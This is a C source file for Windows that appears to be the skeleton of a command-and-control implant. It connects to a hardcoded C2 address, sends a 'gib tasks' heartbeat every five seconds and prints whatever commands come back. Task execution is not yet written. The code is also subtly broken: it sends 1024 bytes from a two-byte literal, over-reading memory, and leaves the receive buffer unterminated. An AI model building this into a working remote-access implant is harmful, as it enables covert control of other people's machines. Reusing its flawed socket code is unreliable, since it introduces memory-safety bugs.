#define WIN32_LEAN_AND_MEAN

#include<windows.h>
#include<winsock2.h>
#include<WS2tcpip.h>
#include<stdio.h>
#include<stdlib.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFFLEN 1024 //max bytes to send/recieve
#define DEFAULT_PORT "12102"

int main() {
	WSADATA wsaData;
	//initialize use of WS2_32.dll
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	//get address info for result
	struct addrinfo* result = NULL;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	
	//PLANNED FEATURE: get ip address of server and pass it into here before compile
	int iResult = getaddrinfo("192.168.232.1", DEFAULT_PORT, &hints, &result);

	if (iResult != 0) {
		printf("getaddrinfo failed with error %d\n", iResult);
		WSACleanup();
		return 1;
	}

	//create socket and attempt to connect to server 
	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		printf("Unable to connect to C2\n");
		return 1;
	}
	freeaddrinfo(result);
	
	//Infinite loop for recieving and sending back information 

	//Infinite loop that serves as the heartbeat
	while(true) {
		// Send a message to the server, asking for tasks
		send(ConnectSocket, "gib tasks", strlen("gib tasks"), 0);

		//printf("Ready to recieve\n");
		char recvmessage[DEFAULT_BUFFLEN];
		ZeroMemory(recvmessage, DEFAULT_BUFFLEN);
		recv(ConnectSocket, recvmessage, DEFAULT_BUFFLEN, 0);

		if (strcmp(recvmessage, "quit") == 0) {
			send(ConnectSocket, "\xff", DEFAULT_BUFFLEN, 0);
			break;
		}
		else {
			printf("Recieved message %s\n", recvmessage);
			//send(ConnectSocket, "Hello Server!", strlen("Hello Server!"), 0);
			//send(ConnectSocket, "\xff", strlen("\xff"), 0);
		}
		Sleep(5000);
	}
	
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;

}
